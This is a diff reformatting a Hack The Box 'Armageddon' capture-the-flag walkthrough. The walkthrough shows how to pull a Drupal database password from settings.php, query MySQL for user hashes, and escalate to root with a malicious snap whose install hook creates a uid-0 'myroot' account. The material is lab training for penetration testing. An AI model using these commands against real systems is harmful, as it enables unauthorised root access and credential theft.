@@ -5,7 +5,7 @@
 **Machine name:** Armageddon  
 **IP:** 10.10.10.233  
 **Written by:** Adir Biran  
-**Tools:** Nmap, Gobuster, Metasploit, hashcat, snap  
+**Tools and Techniques:** Nmap, Gobuster, Metasploit, hashcat, snap, CVE  
 **Method:** Enumerating the website for services and versions and exploiting using Metasploit.  
 Finding credentials in configurations file and escalating to root by abusing snap.
 
@@ -90,7 +90,9 @@ Navigating to the sites/default directory from the enumeration phase.
 
 Copying the content of settings.php to the local machine for easier investigation.  
 Getting relevant information from the file using the following command:  
-**cat settings.php | grep -A 10 -B 10 password**  
+```
+cat settings.php | grep -A 10 -B 10 password  
+```
 (10 lines before and after each occurence of the word "password")  
 
 <p align="center">
@@ -104,25 +106,33 @@ password: CQHEy@9M*m23gBVj
 Terminal is non-interactive, better show results with inline commands.  
 
 Show the databases:  
-**mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e "show databases;"**  
+```
+mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e "show databases;"
+```  
 <p align="center">
 <img width="254" alt="11-db" src="https://user-images.githubusercontent.com/21021400/143077295-59554739-c8e0-47bb-b992-a4270c276950.png">
 </p>
 
 Show the tables:  
-**mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e "use drupal; show tables;"**  
+```
+mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e "use drupal; show tables;"
+```
 <p align="center">
 <img width="121" alt="12-db" src="https://user-images.githubusercontent.com/21021400/143077298-f284822b-e20a-474b-ab92-eda11e3f2761.png">
 </p>
 
 Show all users table:  
-**mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e "use drupal; select * from users;"**  
+```
+mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e "use drupal; select * from users;"
+```
 <p align="center">
 <img width="502" alt="13-db" src="https://user-images.githubusercontent.com/21021400/143077301-0e5ec62b-11b8-407c-8304-3bc2d3e5db6c.png">
 </p>
 
 Show only name and password from users table:  
-**mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e "use drupal; select name,pass from users;"**  
+```
+mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e "use drupal; select name,pass from users;"  
+```
 <p align="center">
 <img width="348" alt="14-db" src="https://user-images.githubusercontent.com/21021400/143077303-007a13bc-bc6f-4586-95d3-0349b53f9bd7.png">
 </p>
@@ -173,7 +183,9 @@ https://blog.ikuamike.io/posts/2021/package_managers_privesc/#exploitation-snap
 
 On the local machine:  
 Install snap by typing the following command:  
-**gem install snap**  
+```
+gem install snap
+```
 
 Create the following directories using mkdir with -p flag:  
 snap/meta/hooks  
@@ -182,8 +194,11 @@ snap/meta/hooks
 </p>
 
 Create a file named "install" in the hooks directory with the following content:  
-**#!/bin/bash  
-/usr/sbin/useradd -p $(openssl passwd -1 pass) -u 0 -o -s /bin/bash -m myroot**  
+```
+#!/bin/bash  
+/usr/sbin/useradd -p $(openssl passwd -1 pass) -u 0 -o -s /bin/bash -m myroot
+```
+
 <p align="center">
 <img width="313" alt="22-installcontent" src="https://user-images.githubusercontent.com/21021400/143077256-ddc8569e-785e-446b-8158-8ac2f00f85eb.png">
 </p>
@@ -197,7 +212,9 @@ Changing the install file permissions to be executable.
 
 Inside the snap directory:  
 Type the following command to generate a snap package of the install file:  
-**fpm -n xxxx -s dir -t snap -a all meta**  
+```
+fpm -n xxxx -s dir -t snap -a all meta**  
+```
 <p align="center">
 <img width="180" alt="24-snapfpm" src="https://user-images.githubusercontent.com/21021400/143077260-ab89d28a-16a6-465b-99a6-909e5b1f91e3.png">
 </p>
@@ -214,7 +231,9 @@ Since wget is disabled we will use curl instead.
 </p>
 
 Executing the snap file using the command:  
-**sudo -u root /usr/bin/snap install exploit.snap --dangerous --devmode**  
+```
+sudo -u root /usr/bin/snap install exploit.snap --dangerous --devmode  
+```
 <p align="center">
 <img width="425" alt="27-executesnap" src="https://user-images.githubusercontent.com/21021400/143077266-8b602477-8232-43db-8719-7061d0248797.png">
 </p>
